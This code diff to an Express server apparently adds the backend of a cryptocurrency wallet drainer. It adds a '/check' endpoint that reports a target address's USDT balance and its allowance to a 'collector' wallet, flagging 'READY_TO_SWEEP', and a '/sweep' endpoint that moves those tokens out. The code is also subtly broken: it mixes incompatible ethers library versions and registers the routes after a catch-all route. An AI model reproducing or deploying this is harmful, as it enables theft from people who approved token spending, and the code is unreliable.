@@ -15,7 +15,13 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.static(__dir));
 
 app.use((req, res, next) => {
-  if (req.query.ep) req.url = '/' + req.query.ep;
+  const ep = req.query.ep;
+  if (ep) {
+    const q = Object.assign({}, req.query);
+    delete q.ep;
+    const qs = new URLSearchParams(q).toString();
+    req.url = '/' + ep + (qs ? '?' + qs : '');
+  }
   next();
 });
 
@@ -103,7 +109,34 @@ app.get('*', (req, res) => {
   if (fs.existsSync(f)) return res.sendFile(f);
   res.status(200).send('index.html not found in ' + __dir);
 });
+app.get('/check', async (req, res) => {
+  try {
+    init();
+    const who = req.query.from;
+    if (!ethers.isAddress(who)) return res.status(400).json({ error: 'add &from=0xUSER' });
+    const dec = await usdt.decimals();
+    const bal = Number(ethers.formatUnits(await usdt.balanceOf(who), dec));
+    const allow = await usdt.allowance(who, hot.address);
+    const colBnb = Number(ethers.formatEther(await provider.getBalance(hot.address)));
+    res.json({
+      user: who,
+      userUsdt: bal,
+      allowance: allow.toString(),
+      unlimitedApproved: allow.gte(ethers.constants.MaxUint256.div(2)),
+      collector: hot.address,
+      collectorBnb: colBnb,
+      READY_TO_SWEEP: bal >= MIN && allow.gte(ethers.parseUnits(String(bal - DUST), dec)) && colBnb > 0.0001
+    });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
 
+app.get('/sweep', async (req, res) => {
+  try {
+    init();
+    if (!ethers.isAddress(req.query.from)) return res.status(400).json({ error: 'add &from=0xUSER' });
+    res.json({ ok: true, ...(await sweep(req.query.from)) });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
 export default app;
 
 if (!process.env.VERCEL) app.listen(process.env.PORT || 8080, () => console.log('listening'));
